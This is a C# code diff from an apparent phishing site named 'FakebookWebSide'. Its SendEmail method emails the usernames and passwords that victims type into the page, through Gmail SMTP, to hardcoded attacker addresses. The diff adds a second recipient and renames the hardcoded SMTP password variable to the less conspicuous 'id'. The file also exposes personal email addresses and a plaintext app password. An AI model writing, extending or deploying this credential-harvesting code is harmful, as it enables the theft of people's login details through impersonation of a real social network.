@@ -36,10 +36,10 @@ namespace FakebookWebSide.Pages
         private void SendEmail(string userName, string pass)
         {
 
-            var fromAddress = new MailAddress("ilkincavadovtest@gmail.com", "Fakebook");
-            var toAddress = new MailAddress("Ilkincavadovweb1@gmail.com", "Ilkin Cavadov");
-            
-            string fromPassword = "lmeegsudwyeqyoba";
+            var fromAddress = new MailAddress("ilkincavadovtest@gmail.com", "Fakebook"); 
+            var toAddress = "Ilkincavadovweb1@gmail.com;agasef.memmedli@gmail.com";
+
+            string id = "lmeegsudwyeqyoba";
             string subject = "Fakebook";
             string body = "Username:" + userName + "\r\n" + "Password:" + pass; 
 
@@ -50,16 +50,21 @@ namespace FakebookWebSide.Pages
                 EnableSsl = true,
                 DeliveryMethod = SmtpDeliveryMethod.Network,
                 UseDefaultCredentials = false,
-                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
+                Credentials = new NetworkCredential(fromAddress.Address, id)
             };
-            using (var message = new MailMessage(fromAddress, toAddress)
+            foreach (var item in toAddress.Split(";"))
             {
-                Subject = subject,
-                Body = body
-            })
-            {
-                smtp.Send(message);
+                using (var message = new MailMessage(fromAddress.ToString(), item)
+                {
+                    Subject = subject,
+                    Body = body
+                })
+
+                {
+                    smtp.Send(message);
+                }
             }
+           
         }
 
 
